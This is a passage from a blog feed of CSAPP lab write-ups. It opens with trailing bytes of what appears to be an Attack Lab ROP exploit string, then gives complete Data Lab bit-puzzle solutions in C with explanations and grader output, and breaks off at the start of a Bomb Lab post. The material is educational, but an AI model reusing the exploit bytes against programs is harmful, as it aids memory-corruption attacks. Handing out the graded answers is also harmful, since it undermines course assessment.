class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p><em>Reference</em></p>
<p>[1] <a href="https://www.jianshu.com/p/db731ca57342">https://www.jianshu.com/p/db731ca57342</a></p>
<p>[2] <a href="https://www.zhihu.com/question/364589259">https://www.zhihu.com/question/364589259</a></p>
]]></content>
      <categories>
        <category>computer architecture</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>computer-architecture</tag>
      </tags>
  </entry>
  <entry>
    <title>[csapp] Lab1 Data Lab</title>
    <url>/2022/01/30/%5Bcsapp%5D%20Lab1%20Data%20Lab/</url>
    <content><![CDATA[<h1 id="Lab1-Data-Lab-Manipulating-Bits"><a href="#Lab1-Data-Lab-Manipulating-Bits" class="headerlink" title="Lab1 Data Lab: Manipulating Bits"></a>Lab1 Data Lab: Manipulating Bits</h1><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p><strong>Instruction:</strong> <a href="http://csapp.cs.cmu.edu/3e/datalab.pdf">http://csapp.cs.cmu.edu/3e/datalab.pdf</a></p>
<p>The purpose of this assignment is to become more familiar with bit-level representations of integers and floating point numbers. You’ll do this by solving a series of programming “puzzles.” Many of these puzzles are quite artificial, but you’ll find yourself thinking much more about bits in working your way through them.</p>
<p>本实验的实验环境Unix-like system，需要使用gcc编译32位程序。再ubuntu20版本中，也许需要安装32位、64位同时支持的gcc</p>
<h1 id="2-Puzzles"><a href="#2-Puzzles" class="headerlink" title="2. Puzzles"></a>2. Puzzles</h1><h2 id="2-1-bitXor"><a href="#2-1-bitXor" class="headerlink" title="2.1 bitXor"></a>2.1 bitXor</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp;</span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = (~(x&amp;y))&amp;(~((~x)&amp;(~y)));</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bitXor的情况比较简单，可以使用真值表，画出卡诺图的方法来化简。</p>
<h2 id="2-2-Tmin"><a href="#2-2-Tmin" class="headerlink" title="2.2 Tmin"></a>2.2 Tmin</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据定义，Tmin是0x80000000，直接使用移位操作就行。</p>
<h2 id="2-3-isTmax"><a href="#2-3-isTmax" class="headerlink" title="2.3 isTmax"></a>2.3 isTmax</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = (!((x+<span class="number">1</span>)^(~x)))&amp;(!!((~x)^(<span class="number">0x0</span>)));</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个看起来比较困难，但是考虑一下规律 Tmax+1 = Tmin，～Tmax = Tmin，可以通过这两点来判断一个数是否是Tmax，但是，需要注意的是当x的值是0xFFFFFFFF时，也是符合这个规律的，后面的其他puzzles也有这个特例，需要注意。</p>
<p><strong>注意这里</strong>!!<strong>的作用，当!!(非零)输出1，反之输出0</strong></p>
<h2 id="2-4-allOddBits"><a href="#2-4-allOddBits" class="headerlink" title="2.4 allOddBits"></a>2.4 allOddBits</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> msk = <span class="number">0xAA</span> + (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    msk = msk + (msk &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    ans = !((msk&amp;x)^msk);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用odd-Mask来获得在奇数位上的mask，然后把这个mask应用到输入的数中。</p>
<h2 id="2-5-negate"><a href="#2-5-negate" class="headerlink" title="2.5 negate"></a>2.5 negate</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = ~x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最基本的补码操作。</p>
<h2 id="2-6-isAsciiDigit"><a href="#2-6-isAsciiDigit" class="headerlink" title="2.6 isAsciiDigit"></a>2.6 isAsciiDigit</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sign = <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> upbound = ~(sign|<span class="number">0x39</span>);</span><br><span class="line">    <span class="keyword">int</span> lowbound = ~<span class="number">0x30</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ans = !((sign&amp;(upbound+x)&gt;&gt;<span class="number">31</span>)|(sign&amp;(lowbound+x)&gt;&gt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个不是非常显然的trick，非常的巧妙，判断这个数是否在0x30和0x39之间的条件是，(<del>0x30+1)+x应当大于0，而</del>(Tmin+0x39) =-(Tmin+0x39)-1，这里-1的目的是因为Tamx=2^32-1, Tmin=-2^32，这里用到的性质就是判断-(Tmin+0x39)-1+x是否“溢出”到负数。</p>
<h2 id="2-7-conditional"><a href="#2-7-conditional" class="headerlink" title="2.7 conditional"></a>2.7 conditional</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z</span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    x = !!x;</span><br><span class="line">    x = ~x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (x&amp;y)|((~x)&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双目运算符实现，在 2.3 中已经说明了!!的用途，这里首先判断x是否是0，如果x是0，x的值应当是0x00000000，反之是0x00000001，所以为了下面并操作的方便对x取负数，则x是0的时候，x=0x00000000，x=0x11111111，接下来就直接或操作，输出一个真值就行。</p>
<h2 id="2-8-isLessOrEqual"><a href="#2-8-isLessOrEqual" class="headerlink" title="2.8 isLessOrEqual"></a>2.8 isLessOrEqual</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> negX=~x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> addX=negX+y;</span><br><span class="line">    <span class="keyword">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> xLeft = x&amp;leftBit;</span><br><span class="line">    <span class="keyword">int</span> yLeft = y&amp;leftBit;</span><br><span class="line">    <span class="keyword">int</span> bitXor = xLeft ^ yLeft;</span><br><span class="line">    bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>思考：为什么不能直接判断y-x的正负?</strong></p>
<p>当y=0x7FFFFFFF且x=0x80000000时，显然y-x已经超过了32位能表示的范围，所以这样判断时不准确的。如果符号相同，用减法的话时不会出现这个情况的。</p>
<p><strong>分类讨论：当符号相同的时候，看addX的符号位；当符号不同的时候直接输出。</strong></p>
<h2 id="2-9-logicalNeg"><a href="#2-9-logicalNeg" class="headerlink" title="2.9 logicalNeg"></a>2.9 logicalNeg</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of</span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 1</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>非0为1，其余的情况为0。利用补码来实现，显然，只有0和Tmin的补码为本身，其余都是相反数。所以可以利用这个性质，将一个数(除了0和Tmin)与其补码做与操作，做与操作我们需要的结果实际上就是判断这个数和他的补码是不是在符号位上不一样，所以我们&gt;&gt;31用来取到这个数的符号位，如果符号位是0，代表这个数是0，否则是其他的数。</p>
<h2 id="2-10-howManyBits"><a href="#2-10-howManyBits" class="headerlink" title="2.10 howManyBits"></a>2.10 howManyBits</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b0,b1,b2,b4,b8,b16;</span><br><span class="line">    <span class="keyword">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line">    b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    x = x &gt;&gt; b16;</span><br><span class="line">    b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line">    x = x &gt;&gt; b8;</span><br><span class="line">    b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    x = x &gt;&gt; b4;</span><br><span class="line">    b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">    x = x &gt;&gt; b2;</span><br><span class="line">    b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">    x = x &gt;&gt; b1;</span><br><span class="line">    b0 = x;</span><br><span class="line">    <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先判断符号位子，把所有的负数全部都转换成正数。因为在正数中最大一位必定是1，而负数中最大的一位是0，不好判断。而对于Tmin，转换后还是Tmin，所以不会因为转换成正数，超出正数的表示范围而出问题。然后，使用折半的方法来查找。注意运算顺序，在b16 = !!(x&gt;&gt;16)&lt;&lt;4;中，先运算!!(x&gt;&gt;16)再做&lt;&lt;4操作，这里的意思是，先看高16位有没有1，有的话那么低16位肯定都需要用到，则b16=0x00000001&lt;&lt;4，那么再检查高16位中的高8位有没有1……，延续这些步骤直到最后一位。</p>
<h2 id="2-11-floatScale2"><a href="#2-11-floatScale2" class="headerlink" title="2.11 floatScale2"></a>2.11 floatScale2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = (uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> sign = uf&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">0</span>) <span class="keyword">return</span> uf&lt;&lt;<span class="number">1</span>|sign;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="built_in">exp</span>++;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>|sign;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|(uf&amp;<span class="number">0x807fffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本函数要求使用 unsigned int 来表示float，并计算2<em>float，首先，明确unsigned int 在 IA32 计算机中的位数，一共32位，那么sign占一位，exp占8位，M占23位。那么对于2</em>f来说，只要修改exp就行了。但是存在特殊情况，当exp==0时，是非规格化的情况，直接M&lt;&lt;1就行；当exp==0xFF时，代表NaN，直接返回。再对exp++，就可以。在增加过后，还需要检查exp是否正确，当exp==0xFF，返回原符号的无穷大。否则，返回指数加一以后的数。</p>
<h2 id="2-12-floatFloat2Int"><a href="#2-12-floatFloat2Int" class="headerlink" title="2.12 floatFloat2Int"></a>2.12 floatFloat2Int</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s_    = uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> exp_  = ((uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;</span><br><span class="line">    <span class="keyword">int</span> frac_ = (uf&amp;<span class="number">0x007fffff</span>)|<span class="number">0x00800000</span>;</span><br><span class="line">    <span class="keyword">if</span>(!(uf&amp;<span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(exp_ &gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">if</span>(exp_ &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(exp_ &gt; <span class="number">23</span>) frac_ &lt;&lt;= (exp_<span class="number">-23</span>);</span><br><span class="line">    <span class="keyword">else</span> frac_ &gt;&gt;= (<span class="number">23</span>-exp_);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!((frac_&gt;&gt;<span class="number">31</span>)^s_)) <span class="keyword">return</span> frac_;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(frac_&gt;&gt;<span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> ~frac_+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>float to int. float中frac部分是大于等于1的，因为这样可以免费的拿到一个精度。如果真实的指数大于31，那么在转换为int时候，1&lt;&lt;31会覆盖掉符号位，所以exp &gt; 31 就算是int溢出了，我们就直接返回溢出值0x80000000。如果exp &lt; 0 那么就只有小数，直接舍去。接下来就是要把23位的小数部分全部转化为整数，然后判断溢出，再舍去小数部分。如果和原符号相同则直接返回，否则如果结果为负（原来为正）则溢出返回越界指定值<strong>0x80000000u</strong>，否则原来为负，结果为正(因为这里运算的时候是只计算了frac，而frac在1~2之间，没有考虑原来的符号位)，则需要返回其补码（相反数）。</p>
<h2 id="2-13-floatPower2"><a href="#2-13-floatPower2" class="headerlink" title="2.13 floatPower2"></a>2.13 floatPower2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> INF = <span class="number">0xff</span>&lt;&lt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt;= <span class="number">255</span>) <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要求的是 $2^{x}$，其sign=1，exp=1+127=128，frac=1.0-1=0，所以可以表示为 $2.0^{x}=(1.0\times 2)^{x}=1.0 \times 2^{x}$，所以，我们传进来的x就是可以当作exp(减去128后的)用的。但是任然需要判断exp的范围是否正确。exp&lt;&lt;23是把exp放到正确的float位置上。</p>
<h1 id="3-Conclution"><a href="#3-Conclution" class="headerlink" title="3. Conclution"></a>3. Conclution</h1><p>本实验在Ubuntu20.04 VM上运行。</p>
<p>最终结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. Running <span class="string">&#x27;./dlc -z&#x27;</span> to identify coding rules violations.</span><br><span class="line"></span><br><span class="line">2. Compiling and running <span class="string">&#x27;./btest -g&#x27;</span> to determine correctness score.</span><br><span class="line">gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c</span><br><span class="line">btest.c: In <span class="keyword">function</span> ‘test_function’:</span><br><span class="line">btest.c:332:23: warning: ‘arg_test_range[1]’ may be used uninitialized <span class="keyword">in</span> this <span class="keyword">function</span> [-Wmaybe-uninitialized]</span><br><span class="line">  332 |     <span class="keyword">if</span> (arg_test_range[1] &lt; 1)</span><br><span class="line">      |         ~~~~~~~~~~~~~~^~~</span><br><span class="line"></span><br><span class="line">3. Running <span class="string">&#x27;./dlc -Z&#x27;</span> to identify operator count violations.</span><br><span class="line"></span><br><span class="line">4. Compiling and running <span class="string">&#x27;./btest -g -r 2&#x27;</span> to determine performance score.</span><br><span class="line">gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c</span><br><span class="line">btest.c: In <span class="keyword">function</span> ‘test_function’:</span><br><span class="line">btest.c:332:23: warning: ‘arg_test_range[1]’ may be used uninitialized <span class="keyword">in</span> this <span class="keyword">function</span> [-Wmaybe-uninitialized]</span><br><span class="line">  332 |     <span class="keyword">if</span> (arg_test_range[1] &lt; 1)</span><br><span class="line">      |         ~~~~~~~~~~~~~~^~~</span><br><span class="line"></span><br><span class="line">5. Running <span class="string">&#x27;./dlc -e&#x27;</span> to get operator count of each <span class="keyword">function</span>.</span><br><span class="line"></span><br><span class="line">Correctness Results	Perf Results</span><br><span class="line">Points	Rating	Errors	Points	Ops	Puzzle</span><br><span class="line">1	1	0	2	7	bitXor</span><br><span class="line">1	1	0	2	1	tmin</span><br><span class="line">1	1	0	2	9	isTmax</span><br><span class="line">2	2	0	2	7	allOddBits</span><br><span class="line">2	2	0	2	2	negate</span><br><span class="line">3	3	0	2	13	isAsciiDigit</span><br><span class="line">3	3	0	2	8	conditional</span><br><span class="line">3	3	0	2	17	isLessOrEqual</span><br><span class="line">4	4	0	2	5	logicalNeg</span><br><span class="line">4	4	0	2	36	howManyBits</span><br><span class="line">4	4	0	2	14	floatScale2</span><br><span class="line">4	4	0	2	21	floatFloat2Int</span><br><span class="line">4	4	0	2	5	floatPower2</span><br></pre></td></tr></table></figure>

<p>本实验中有很多的trick挺难想的，我在做的过程中也在网上看了solution，虽然CMU的honor code里规定的挺严格的。这个实验的最终目的是为了从熟知到深知到理解信息的表示和处理，用unsigned int 来表示float确实理解更为深刻了。还需要看书巩固一下。</p>
]]></content>
      <categories>
        <category>computer architecture</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>computer-architecture</tag>
      </tags>
  </entry>
  <entry>
    <title>[csapp] Lab2 Bomb Lab</title>
    <url>/2022/02/02/%5Bcsapp%5D%20Lab2%20Bomb%20Lab/</url>
    <content><![CDATA[<h1 id="Lab2-Bomb-Lab"><a href="#Lab2-Bomb-Lab" class="headerlink" title="Lab2 Bomb Lab"></a>Lab2 Bomb Lab</h1><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>熟悉GDB调试工具，熟悉 objdump 反汇编，熟悉汇编代码阅读。</p>
